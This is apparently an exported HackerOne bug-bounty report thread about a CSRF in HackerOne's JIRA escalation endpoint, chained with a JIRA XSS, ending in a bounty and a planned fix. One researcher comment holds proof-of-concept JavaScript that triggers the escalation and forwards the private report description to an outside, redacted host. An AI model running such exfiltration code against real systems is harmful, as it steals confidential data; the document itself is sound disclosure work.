{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-08-30T02:53:54.420Z", 
    "voters": [
        "jokebookservice1", 
        "cache-money", 
        "bl4de", 
        "jensec", 
        "whhackersbr", 
        "robd4k", 
        "yumi", 
        "eveeez", 
        "madrobot", 
        "axolotl", 
        "and 21 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 226418, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-08-30T09:33:31.369Z", 
    "vulnerability_information": "**Summary:**\n\nHackerOne reports escalation to JIRA is CSRF vulnerable\n\n**Description (Include Impact):**\n\nAn attacker can steal private reports details through a CSRF in HackerOne report escalation to JIRA implementation.\n\n### CSRF\n\nGET https://hackerone.com/reports/[REPORT_NUMBER]/escalate\n\n### Optional: Supporting Material/References (Screenshots)\n\n * https://youtu.be/N6JSGA_RIV4", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "none", 
            "user_interaction": "required", 
            "attack_vector": "network", 
            "attack_complexity": "high", 
            "scope": "unchanged", 
            "integrity": "none", 
            "availability": "none"
        }, 
        "rating": "medium", 
        "score": 5.3, 
        "author_type": "Team"
    }, 
    "title": "HackerOne reports escalation to JIRA is CSRF vulnerable", 
    "is_member_of_team?": null, 
    "vote_count": 31, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-09-29T02:53:54.493Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-05-05T20:39:25.909Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-05T20:39:25.909Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "I will provide a PoC in a few minutes.", 
            "markdown_message": "<p>I will provide a PoC in a few minutes.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1657322, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-05T21:16:32.253Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-05T21:16:32.253Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Real World Attack PoC: https://youtu.be/2YqFy3FqysA", 
            "markdown_message": "<p>Real World Attack PoC: <a title=\"https://youtu.be/2YqFy3FqysA\" href=\"/redirect?signature=fe2df22a99f0cc136c9eb2a6475ab471e783e4a9&amp;url=https%3A%2F%2Fyoutu.be%2F2YqFy3FqysA\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://youtu.be/2YqFy3FqysA</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 1657430, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-05T21:31:43.752Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-05T21:32:40.221Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "At first glance, you can say \"If the attacker has an XSS in Attlassian, it is a game over anyway, this is not our fault\". But have in mind that with my PoC the victim is not logged to his JIRA account.\n\nI am using bugs #3 and #4 from report #226199 in my PoC.", 
            "markdown_message": "<p>At first glance, you can say &quot;If the attacker has an XSS in Attlassian, it is a game over anyway, this is not our fault&quot;. But have in mind that with my PoC the victim is not logged to his JIRA account.</p>\n\n<p>I am using bugs #3 and #4 from report <a href=\"/reports/226199\">#226199</a> in my PoC.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1657492, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-07T13:38:57.614Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-07T13:38:57.614Z", 
            "actor": {
                "username": "asuka", 
                "url": "/asuka", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/923/c73a42c0f9ea47ce5554fbab2411978f2bb985f8_medium.jpg?1474068574"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Low (3.1)", 
                "old_severity": "High (7.5)"
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 1658964, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-07T13:39:49.668Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-07T13:39:49.668Z", 
            "actor": {
                "username": "asuka", 
                "url": "/asuka", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/923/c73a42c0f9ea47ce5554fbab2411978f2bb985f8_medium.jpg?1474068574"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks for the report @whhackersbr. We're looking into this and will get back to you shortly.", 
            "markdown_message": "<p>Thanks for the report <a href=\"/whhackersbr\">@whhackersbr</a>. We&#39;re looking into this and will get back to you shortly.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1658966, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-11T02:13:34.649Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-11T02:13:34.649Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Ok.", 
            "markdown_message": "<p>Ok.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1667113, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-16T08:14:32.089Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-16T08:14:32.089Z", 
            "actor": {
                "username": "wvdv", 
                "url": "/wvdv", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/221/f03ca5583ecb03686fa2f7bf5330d6ca4a51ba5f_medium.png?1422363609"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hello @whhackersbr,\n\nCan you give a little bit more information on how you pull this off? In the video, you jump from typing a comment on a report to an alert on Atlassian, what just happened? Did you escalate? If so, what are your JIRA integration settings? And what payload did you use for the malicious URL? \n\nLots of questions and I think providing a PoC that I can execute on my machine will help me a lot to understand what's going on.\n\nThanks,\n\nWillian ", 
            "markdown_message": "<p>Hello <a href=\"/whhackersbr\">@whhackersbr</a>,</p>\n\n<p>Can you give a little bit more information on how you pull this off? In the video, you jump from typing a comment on a report to an alert on Atlassian, what just happened? Did you escalate? If so, what are your JIRA integration settings? And what payload did you use for the malicious URL? </p>\n\n<p>Lots of questions and I think providing a PoC that I can execute on my machine will help me a lot to understand what&#39;s going on.</p>\n\n<p>Thanks,</p>\n\n<p>Willian </p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 1676499, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-16T22:38:27.273Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-16T22:39:03.347Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "@security @wvdv,\n\n> Can you give a little bit more information on how you pull this off? In the video, you jump from typing a comment on a report to an alert on Atlassian, what just happened?\n\n#Video timeline:#\n\n**0:30**\nI clicked on `Malicious Link`.\nThe malicious link exploits bugs #3 and #4 from report #226199 to open a JIRA URL without the H1 warning, just that, nothing else.\nThe JIRA URL has an XSS payload (an unauthenticated JIRA endpoint is vulnerable to XSS).\n\n**0:43**\nI would write: \"My internet is too slow today, I am sorry\".\nIgnore.\n\n**0:45**\nI am using the JIRA XSS to show an alert.\n\n**1:00**\nI am using the JIRA XSS and the HackerOne CSRF (GET https://hackerone.com/reports/226418/escalate) to steal private data about the report #226418.\n\n> Lots of questions and I think providing a PoC that I can execute on my machine will help me a lot to understand what's going on.\n\nI will try to provide a theoretical PoC in a few hours, but I can not send the full PoC because I am exploiting an XSS in JIRA and this would be unethical, I am sorry and I hope you can understand.\n\nIf you read this before my PoC and you understand the issue, please tell me and I stop coding the PoC.\n;-)\n\nThanks.\n\n", 
            "markdown_message": "<p><a href=\"/security\">@security</a> <a href=\"/wvdv\">@wvdv</a>,</p>\n\n<blockquote>\n<p>Can you give a little bit more information on how you pull this off? In the video, you jump from typing a comment on a report to an alert on Atlassian, what just happened?</p>\n</blockquote>\n\n<h1 id=\"video-timeline\">Video timeline:</h1>\n\n<p><strong>0:30</strong><br>\nI clicked on <code>Malicious Link</code>.<br>\nThe malicious link exploits bugs #3 and #4 from report <a href=\"/reports/226199\">#226199</a> to open a JIRA URL without the H1 warning, just that, nothing else.<br>\nThe JIRA URL has an XSS payload (an unauthenticated JIRA endpoint is vulnerable to XSS).</p>\n\n<p><strong>0:43</strong><br>\nI would write: &quot;My internet is too slow today, I am sorry&quot;.<br>\nIgnore.</p>\n\n<p><strong>0:45</strong><br>\nI am using the JIRA XSS to show an alert.</p>\n\n<p><strong>1:00</strong><br>\nI am using the JIRA XSS and the HackerOne CSRF (GET <a title=\"https://hackerone.com/reports/226418/escalate\" href=\"https://hackerone.com/reports/226418/escalate\">https://hackerone.com/reports/226418/escalate</a>) to steal private data about the report <a href=\"/reports/226418\">#226418</a>.</p>\n\n<blockquote>\n<p>Lots of questions and I think providing a PoC that I can execute on my machine will help me a lot to understand what&#39;s going on.</p>\n</blockquote>\n\n<p>I will try to provide a theoretical PoC in a few hours, but I can not send the full PoC because I am exploiting an XSS in JIRA and this would be unethical, I am sorry and I hope you can understand.</p>\n\n<p>If you read this before my PoC and you understand the issue, please tell me and I stop coding the PoC.<br>\n;-)</p>\n\n<p>Thanks.</p>\n", 
            "type": "Activities::BugNew", 
            "id": 1678618, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-17T09:09:59.130Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-17T09:09:59.130Z", 
            "actor": {
                "username": "wvdv", 
                "url": "/wvdv", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/221/f03ca5583ecb03686fa2f7bf5330d6ca4a51ba5f_medium.png?1422363609"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Right, so you've found an issue in JIRA. Have you already reported this issue to Atlassian? About your PoC, we're here to make our product safer, not to steal your findings.", 
            "markdown_message": "<p>Right, so you&#39;ve found an issue in JIRA. Have you already reported this issue to Atlassian? About your PoC, we&#39;re here to make our product safer, not to steal your findings.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1679551, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-17T16:41:56.259Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-17T16:43:10.634Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey @wvdv,\n\n> Right, so you've found an issue in JIRA. Have you already reported this issue to Atlassian?\n\nNot yet. I will report it when I find free time in my schedule (probably next week).\n\n*I am using JIRA Cloud.\n\n> About your PoC, we're here to make our product safer, not to steal your findings.\n\nI am not afraid that you will steal my findings, hehehe, do not worry about it.\nThis is about ethic. I can not send to you details about a vulnerability of another company.\nWould you like me to share HackerOne vulnerability details with another company? Probably you would not, this is not nice.\n\nSorry for my delay here, yesterday I had a few personal problems.\nToday I will provide a theoretical PoC, so you can confirm the issue on the HackerOne side.\n\nThanks as always.", 
            "markdown_message": "<p>Hey <a href=\"/wvdv\">@wvdv</a>,</p>\n\n<blockquote>\n<p>Right, so you&#39;ve found an issue in JIRA. Have you already reported this issue to Atlassian?</p>\n</blockquote>\n\n<p>Not yet. I will report it when I find free time in my schedule (probably next week).</p>\n\n<p>*I am using JIRA Cloud.</p>\n\n<blockquote>\n<p>About your PoC, we&#39;re here to make our product safer, not to steal your findings.</p>\n</blockquote>\n\n<p>I am not afraid that you will steal my findings, hehehe, do not worry about it.<br>\nThis is about ethic. I can not send to you details about a vulnerability of another company.<br>\nWould you like me to share HackerOne vulnerability details with another company? Probably you would not, this is not nice.</p>\n\n<p>Sorry for my delay here, yesterday I had a few personal problems.<br>\nToday I will provide a theoretical PoC, so you can confirm the issue on the HackerOne side.</p>\n\n<p>Thanks as always.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1681095, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-17T17:10:12.679Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-17T17:10:12.679Z", 
            "actor": {
                "username": "wvdv", 
                "url": "/wvdv", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/221/f03ca5583ecb03686fa2f7bf5330d6ca4a51ba5f_medium.png?1422363609"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "> This is about ethic. I can not send to you details about a vulnerability of another company.\n\nYou are absolutely right.", 
            "markdown_message": "<blockquote>\n<p>This is about ethic. I can not send to you details about a vulnerability of another company.</p>\n</blockquote>\n\n<p>You are absolutely right.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1681181, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-18T03:13:35.708Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-18T03:13:35.708Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Besides the H1 issue, have you reported the JIRA vulnerability to Atlassian via https://www.atlassian.com/trust/security/vulnerability-information-report ? I'm sure they would love to get your report.", 
            "markdown_message": "<p>Besides the H1 issue, have you reported the JIRA vulnerability to Atlassian via <a title=\"https://www.atlassian.com/trust/security/vulnerability-information-report\" href=\"/redirect?signature=9064b352f51345224531cfca4e8bdfe27720f511&amp;url=https%3A%2F%2Fwww.atlassian.com%2Ftrust%2Fsecurity%2Fvulnerability-information-report\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.atlassian.com/trust/security/vulnerability-information-report</span><i class=\"icon-external-link\"></i></a> ? I&#39;m sure they would love to get your report.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1682219, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-25T04:57:58.437Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-30T08:53:32.524Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "@reed,\n\n> Besides the H1 issue, have you reported the JIRA vulnerability to Atlassian via https://www.atlassian.com/trust/security/vulnerability-information-report ? I'm sure they would love to get your report.\n\nNot yet. My priority now is seeing the HackerOne CSRF fixed, after that, I will report the XSS to Atlassian.\n;-)\n\n@security @wvdv,\n\nI am sorry for my delay here.\nI was researching the best way to exploit this attack without leaking details about the unauthenticated JIRA XSS.\n\n**Theoretical PoC:**\n\n1) Go to https://hackerone.com (using a browser incognito window)\n\n2) Sign in with the following credentials\n\n```\nLogin: \u2588\u2588\u2588\u2588\u2588\u2588\nPassword: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n```\n\n3) Go to http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/css/h1_jira_redirect.html\n\n4) Open the browser console and execute the following code (you are simulating an XSS):\n\n```\nvar win;\n\nfunction XSRF() {\n\twin = window.open(\"https://hackerone.com/reports/226236/escalate\");\n\tsetTimeout(function(){getReportDetails();}, 1250);\n}\n\nfunction getReportDetails(){\n\tvar regExp = new RegExp(\"description=(.*?)&\", \"g\");\n\ttry{\n\t\tif(win.location.href){\n\t\t\twin.close();\n\t\t\twindow.location.href = 'http://\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/css/hackerone_csrf_jira_escalate.html?description=' + regExp.exec(win.location.href)[1];\n\t\t}\n\t}\n\tcatch(err){\n\t\tsetTimeout(function(){getReportDetails();}, 250);\n\t}\n}\n\ndocument.documentElement.innerHTML = '<center><input type=\"submit\" value=\"H1 XSRF PoC\" onclick=\"XSRF();\"/></center>';\n```\n\n5) Click on the button\n\nDone!\nYou stole the description of a private H1 report using the JIRA escalation CSRF.", 
            "markdown_message": "<p><a href=\"/reed\">@reed</a>,</p>\n\n<blockquote>\n<p>Besides the H1 issue, have you reported the JIRA vulnerability to Atlassian via <a title=\"https://www.atlassian.com/trust/security/vulnerability-information-report\" href=\"/redirect?signature=9064b352f51345224531cfca4e8bdfe27720f511&amp;url=https%3A%2F%2Fwww.atlassian.com%2Ftrust%2Fsecurity%2Fvulnerability-information-report\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.atlassian.com/trust/security/vulnerability-information-report</span><i class=\"icon-external-link\"></i></a> ? I&#39;m sure they would love to get your report.</p>\n</blockquote>\n\n<p>Not yet. My priority now is seeing the HackerOne CSRF fixed, after that, I will report the XSS to Atlassian.<br>\n;-)</p>\n\n<p><a href=\"/security\">@security</a> <a href=\"/wvdv\">@wvdv</a>,</p>\n\n<p>I am sorry for my delay here.<br>\nI was researching the best way to exploit this attack without leaking details about the unauthenticated JIRA XSS.</p>\n\n<p><strong>Theoretical PoC:</strong></p>\n\n<p>1) Go to <a title=\"https://hackerone.com\" href=\"https://hackerone.com\">https://hackerone.com</a> (using a browser incognito window)</p>\n\n<p>2) Sign in with the following credentials</p>\n<pre class=\"highlight plaintext\"><code>Login: \u2588\u2588\u2588\u2588\u2588\u2588\nPassword: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n</code></pre>\n<p>3) Go to http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/css/h1_jira_redirect.html</p>\n\n<p>4) Open the browser console and execute the following code (you are simulating an XSS):</p>\n<pre class=\"highlight plaintext\"><code>var win;\n\nfunction XSRF() {\n    win = window.open(&quot;https://hackerone.com/reports/226236/escalate&quot;);\n    setTimeout(function(){getReportDetails();}, 1250);\n}\n\nfunction getReportDetails(){\n    var regExp = new RegExp(&quot;description=(.*?)&amp;&quot;, &quot;g&quot;);\n    try{\n        if(win.location.href){\n            win.close();\n            window.location.href = &#39;http://\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/css/hackerone_csrf_jira_escalate.html?description=&#39; + regExp.exec(win.location.href)[1];\n        }\n    }\n    catch(err){\n        setTimeout(function(){getReportDetails();}, 250);\n    }\n}\n\ndocument.documentElement.innerHTML = &#39;&lt;center&gt;&lt;input type=&quot;submit&quot; value=&quot;H1 XSRF PoC&quot; onclick=&quot;XSRF();&quot;/&gt;&lt;/center&gt;&#39;;\n</code></pre>\n<p>5) Click on the button</p>\n\n<p>Done!<br>\nYou stole the description of a private H1 report using the JIRA escalation CSRF.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1699740, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-30T22:51:19.256Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-30T22:51:19.256Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "@wvdv,\n\nCould you reproduce?\n\nThanks.", 
            "markdown_message": "<p><a href=\"/wvdv\">@wvdv</a>,</p>\n\n<p>Could you reproduce?</p>\n\n<p>Thanks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1711647, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-01T09:03:18.745Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-01T09:03:18.745Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 1720567, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-08T19:56:55.733Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-08T19:56:55.733Z", 
            "actor": {
                "username": "jobert", 
                "url": "/jobert", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi @whhackersbr - weighing in here, too. I like that you're chaining the vulnerability with an XSS to store the vulnerability information. However, as you perfectly understand, with the XSS you could create any task. Because this might be exploited when you know a colleague of yours (someone that has access to the same JIRA instance), we'll move to a `POST` request for the `/reports/:id/escalate` endpoint. I haven't looked at how much effort this will take, so I can't give you an ETA on a fix yet. This obviously doesn't solve for the XSS vulnerability in JIRA, but breaks the chain to get access to report content that you might not be authorized to see. Thanks!", 
            "markdown_message": "<p>Hi <a href=\"/whhackersbr\">@whhackersbr</a> - weighing in here, too. I like that you&#39;re chaining the vulnerability with an XSS to store the vulnerability information. However, as you perfectly understand, with the XSS you could create any task. Because this might be exploited when you know a colleague of yours (someone that has access to the same JIRA instance), we&#39;ll move to a <code>POST</code> request for the <code>/reports/:id/escalate</code> endpoint. I haven&#39;t looked at how much effort this will take, so I can&#39;t give you an ETA on a fix yet. This obviously doesn&#39;t solve for the XSS vulnerability in JIRA, but breaks the chain to get access to report content that you might not be authorized to see. Thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1742472, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-06-08T19:57:14.231Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-08T19:57:14.231Z", 
            "actor": {
                "url": "/security", 
                "profile": {
                    "name": "HackerOne"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
                }
            }, 
            "team_handle": "security", 
            "bonus_amount": "0.0", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "whhackersbr", 
                "url": "/whhackersbr"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1742473, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-08T20:07:07.631Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-08T20:07:37.714Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey @jobert,\n\nI perfectly understand your points.\n\nJust have in mind that this vulnerability can be exploited by attackers that don't have access to JIRA instances as well (like me).\n\nIf you are not logged in H1 JIRA instance right now, even so, using the CSRF I can escalate other H1 reports to the JIRA page vulnerable to XSS and steal the private content. Without the CSRF bug, the XSS in JIRA, since you are not logged in, would be useless for me.\n\nThanks.", 
            "markdown_message": "<p>Hey <a href=\"/jobert\">@jobert</a>,</p>\n\n<p>I perfectly understand your points.</p>\n\n<p>Just have in mind that this vulnerability can be exploited by attackers that don&#39;t have access to JIRA instances as well (like me).</p>\n\n<p>If you are not logged in H1 JIRA instance right now, even so, using the CSRF I can escalate other H1 reports to the JIRA page vulnerable to XSS and steal the private content. Without the CSRF bug, the XSS in JIRA, since you are not logged in, would be useless for me.</p>\n\n<p>Thanks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1742652, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-08T20:27:22.692Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-08T20:27:22.692Z", 
            "actor": {
                "username": "jobert", 
                "url": "/jobert", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "@whhackersbr That's true, but only seems to apply to JIRA Cloud, not the hosted JIRA. It depends on the integration they've set up.", 
            "markdown_message": "<p><a href=\"/whhackersbr\">@whhackersbr</a> That&#39;s true, but only seems to apply to JIRA Cloud, not the hosted JIRA. It depends on the integration they&#39;ve set up.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1742857, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-08T20:37:14.453Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-08T20:37:14.453Z", 
            "actor": {
                "username": "whhackersbr", 
                "url": "/whhackersbr", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/529/5007a34f7c314adc61fb9664cd543e71d38af685_medium.png?1473027497"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "@jobert,\n\nYes, I didn't try anything related to hosted JIRA yet, so you are probably right.", 
            "markdown_message": "<p><a href=\"/jobert\">@jobert</a>,</p>\n\n<p>Yes, I didn&#39;t try anything related to hosted JIRA yet, so you are probably right.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1742869, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-20T00:14:01.493Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-20T00:14:01.493Z", 
            "actor": {
                "username": "ebrynne", 
                "url": "/ebrynne", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/191/caa360ba5182e4fd7930e394d9fa654d468e6a20_medium.?1461015075"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey @whhackersbr,\n\nJust wanted to touch base and let you know we're still working on this, and we'll drop you a line as soon as we have a useful update.\n\nThanks!\n\n\nEvan", 
